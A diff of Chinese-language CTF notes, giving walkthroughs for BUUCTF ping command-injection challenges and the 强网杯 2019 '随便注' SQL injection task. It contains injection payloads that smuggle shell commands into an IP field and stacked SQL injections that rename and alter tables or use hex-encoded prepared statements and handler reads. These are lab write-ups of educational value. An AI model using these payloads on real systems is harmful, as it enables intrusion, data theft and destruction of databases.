@@ -124,11 +124,11 @@ echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
 
 题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698200273276-d8bf8b0f-d18f-4412-bd93-8298fe43b65d.png#averageHue=%23fafafa&clientId=u90f92586-9a2e-4&from=paste&height=217&id=u1ff865d8&originHeight=271&originWidth=422&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=7249&status=done&style=none&taskId=uef777c1e-df70-4229-bccf-479692edf47&title=&width=337.6)<br />是一个ping操作，ping个127.0.0.1试试<br />有回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698200374948-9b9106de-3cb0-456c-bcaf-7b2264745f7e.png#averageHue=%23f7f6f6&clientId=u90f92586-9a2e-4&from=paste&height=362&id=u4c09c0b6&originHeight=453&originWidth=737&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=29419&status=done&style=none&taskId=uc6f6b8d9-8e81-4db6-b0a6-ce484f5868b&title=&width=589.6)<br />**看起来有点像PWN的题，猜测通过列出目录文件，是否存在flag文件，并查看文件内容，并且存在两种方法解题，一种是管道符，一种是堆叠查询**
 <a name="kJ9SD"></a>
-## **第一种、管道符**
+### **第一种、管道符**
 列出目录文件<br />`127.0.0.1 | ls`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698200626535-7603173b-89cb-467f-8a80-dd326dc6b9ec.png#averageHue=%23fbfafa&clientId=u90f92586-9a2e-4&from=paste&height=238&id=udc3c072c&originHeight=298&originWidth=608&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14860&status=done&style=none&taskId=ua96231c2-f06f-4b22-bcfc-c615a685d0b&title=&width=486.4)<br />列出隐藏文件<br />`127.0.0.1 | ls -a`<br />发现存在上级目录<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698200737957-c7c1e57b-81ab-4f32-9b73-1132755e7e9f.png#averageHue=%23f9f9f9&clientId=u90f92586-9a2e-4&from=paste&height=272&id=u7222c59c&originHeight=340&originWidth=509&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=13679&status=done&style=none&taskId=u5eb2e479-1d42-4f90-9d87-1e77f1909cc&title=&width=407.2)<br />因此可以看出，此处命令执行并不是在root/根目录下进行的\<br />列出/根目录下的目录文件<br />`127.0.0.1 | ls /`![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698200911159-c35404fc-a613-4749-a295-af252df9ab3f.png#averageHue=%23f7f7f6&clientId=u90f92586-9a2e-4&from=paste&height=542&id=u541df299&originHeight=677&originWidth=758&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=22769&status=done&style=none&taskId=u119b73cc-c464-4645-8912-76002e2bfb9&title=&width=606.4)<br />存在flag，查看根目录下flag文件的内容<br />`127.0.0.1 | cat /flag`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698201091955-da441925-18eb-4b20-a3bc-3d787212779f.png#averageHue=%23fafaf9&clientId=u90f92586-9a2e-4&from=paste&height=235&id=u18dbeba0&originHeight=294&originWidth=551&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=13795&status=done&style=none&taskId=uc0310f77-164d-4d25-9277-7434ed2f55b&title=&width=440.8)<br />**得出flag：**<br />`**flag{ce0a3875-bc2a-49f9-b285-dccdf195531b}**`
 
 <a name="OH7u8"></a>
-## **第二种、堆叠查询**
+### **第二种、堆叠查询**
 列出当前目录文件；列出隐藏文件；列出根目录下的文件；查看根目录下flag文件的内容<br />`127.0.0.1;ls;ls -a;ls /;cat /flag`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698201726844-14a619f6-1821-472c-ac35-9a2ee3f40d45.png#averageHue=%23f5f5f5&clientId=u90f92586-9a2e-4&from=paste&height=758&id=ufa57bd66&originHeight=948&originWidth=1063&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=66837&status=done&style=none&taskId=u995fe147-fc69-4add-b6b4-fa09bff2b73&title=&width=850.4)<br />**得出flag：**<br />`**flag{ce0a3875-bc2a-49f9-b285-dccdf195531b}**`<br />两种方法可以看出有明显的不同
 
 ## [GXYCTF2019]Ping Ping Ping 1
@@ -156,6 +156,42 @@ echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
 > fa$x=flag
 
 **构造payload：**<br />`**URL?ip=0;x=ag;cat${IFS}fl$x.php**`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698219076973-3a184aa5-455d-4a45-a589-0efebf7fb4a3.png#averageHue=%23f7f5f3&clientId=ub5d3c2c2-2e29-4&from=paste&height=38&id=u7ebe6899&originHeight=48&originWidth=350&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2073&status=done&style=none&taskId=u83d5b49d-311e-45fb-bc3b-237b51d3596&title=&width=280)<br />字符报错！<br />猜测"{}"被过滤<br />试试第二种空格绕过方法<br />**构造payload:**<br />`**URL?ip=0;x=ag;cat$IFS$1fl$x.php**`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698219718651-776f6cfd-2a1b-4bf7-a8bd-8bec0412f405.png#averageHue=%23f4f4f4&clientId=ub5d3c2c2-2e29-4&from=paste&height=194&id=ube092bab&originHeight=242&originWidth=572&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=6709&status=done&style=none&taskId=u9d310f28-ddb7-4529-ab14-a89be2deda3&title=&width=457.6)<br />**有回显结果，绕过成功，但是没有发现flag，F12查看网页源代码，看看有没有flag**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698219743590-733bf4b1-15e3-4bad-8374-3d6e45d77975.png#averageHue=%23f4f4f4&clientId=ub5d3c2c2-2e29-4&from=paste&height=216&id=u3ab197a6&originHeight=270&originWidth=581&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12592&status=done&style=none&taskId=u9dcd84a9-a474-4ab9-ad31-1246b948b85&title=&width=464.8)<br />**得出flag：**<br />`flag{08512195-033d-4f18-a5b0-00dcbc58c4b8}`
+
+## buuctf[强网杯 2019]随便注 1(超详细，三种解法）
+
+<a name="evxPg"></a>
+#### **第一种解法 堆叠注入**
+网页环境<br />![image.png](https://img-blog.csdnimg.cn/img_convert/434cfacea88d014f556ac56fdbb36d36.png)<br />判断是否是字符型注入<br />`1'`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/2e8bc28f595dbd11974934fa20cfa369.png)<br />判断是否存在关键字过滤<br />`select`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/2c4f19b88e0523022badbf2d4d7d92ec.png)<br />联合查询被过滤，只能用堆叠注入了<br />查看有几个字段<br />`1' order by 2#`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/e3ca73027a6fe25e7ae0afa4bda848c9.png)<br />正常回显<br />`1' order by 3#`![image.png](https://img-blog.csdnimg.cn/img_convert/895055b725e189d42fe79ffc45702f31.png)<br />回显报错，可以看出只有两个字段<br />查看所有数据库<br />`1'; show databases;`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/823d4fa00155a99b585dde3cf3cef82e.png)<br />查看所有数据表<br />`1'; show tables;`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/b56eead234c1e36df2c5049451dec8a1.png)<br />爆words数据表的字段<br />`1';show columns from words;#`![image.png](https://img-blog.csdnimg.cn/img_convert/72352caabc7e406ed88ce07fb607b3c5.png)<br />爆1919810931114514数据表字段（注意数据表为数字的时候需要用反引号括起来）<br />`1';show columns from `1919810931114514`;#`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/014d47d3f850c8e809957090e00fb188.png)<br />可以看到这两个表words表有两个字段，而另一个只有一个字段<br />后台SQL查询语句应该是：<br />`select * from words where id=`<br />所以说只能先查询id字段，然而另一个表只有一个flag字段是肯定爆不了flag的，并且类型为varchar字符串类型，而恰巧words数据表里面的data也是varchar类型，因此从这里就可以得到做题思路，通过rename函数进行改表，把`1919810931114514`改为words，增加新字段id，将flag改为data，将刚开始那个words表改为其他任意表。<br />构造payload：<br />`1';rename table words to BaiMao;rename table `1919810931114514` to words;alter table words add id int unsigned not NULL auto_increment primary key;alter table words change flag data varchar(100);#`
+> rename修改表名
+> alter修改已知的列
+> add增加
+> int整数类型
+> unsigned无符号类型
+> **not null**- 指示某列不能存储 NULL 值。
+> **primary key** - NOT NULL 和 UNIQUE 的结合。指定主键，确保某列（或多个列的结合）有唯一标识，每个表有且只有一个主键。
+> **auto_increment**-自动赋值，默认从1开始。
+
+成功回显flag：<br />![image.png](https://img-blog.csdnimg.cn/img_convert/8122d53a32c6179d396ce793725a8a9c.png)<br />注意没有回显flag，就类似于你更新了个东西但是没刷新，重新在文本框里面输入1提交即可回显flag。
+<a name="z4q8F"></a>
+#### 第二种解法 编码逃逸 绕过滤
+由于select被过滤，考虑使用编码进行绕过<br />使用select查询就很简单了<br />构造payload<br />`select *from where `1919810931114514``（注意这里使用反引号把这个数字包括住，md编辑器打不上去） <br />*号查询数据表里面的全部内容，这就是爆出flag的原理<br />进行16进制编码加密<br />`73656c656374202a2066726f6d206020313931393831303933313131343531342060`<br />最终payload：<br />`1';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#`
+> - prepare…from…是预处理语句，会进行编码转换。
+> - execute用来执行由SQLPrepare创建的SQL语句。
+> - SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。
+> - 0x就是把后面的编码格式转换成16进制编码格式
+> - 那么总体理解就是，使用SET方法给变量a赋值，给a变量赋的值就是select查询1919810931114514表的所有内容语句编码后的值，execsql方法执行来自a变量的值，prepare...from方法将执行后的编码变换成字符串格式，execute方法调用并执行execsql方法。
+参考：https://blog.csdn.net/qq_44657899/article/details/10323914
+
+回显flag：<br />![image.png](https://img-blog.csdnimg.cn/img_convert/d9511654ed16ddd5152c6598b5fecbde.png)
+<a name="E2zV0"></a>
+#### 第三种解法 handler代替select
+select命令被过滤了怎么办？我们还可以用handler命令进行查看，handler命令可以一行一行的显示数据表中的内容。<br />构造payload：<br />`1'; handler `1919810931114514` open as `a`; handler `a` read next;#`
+> handler代替select，以一行一行显示内容
+> open打开表
+> as更改表的别名为a
+> read next读取数据文件内的数据次数
+
+上传payload，回显flag：<br />![image.png](https://img-blog.csdnimg.cn/img_convert/1aa5220a282ceac998065c80dc38af21.png)
 
 
 
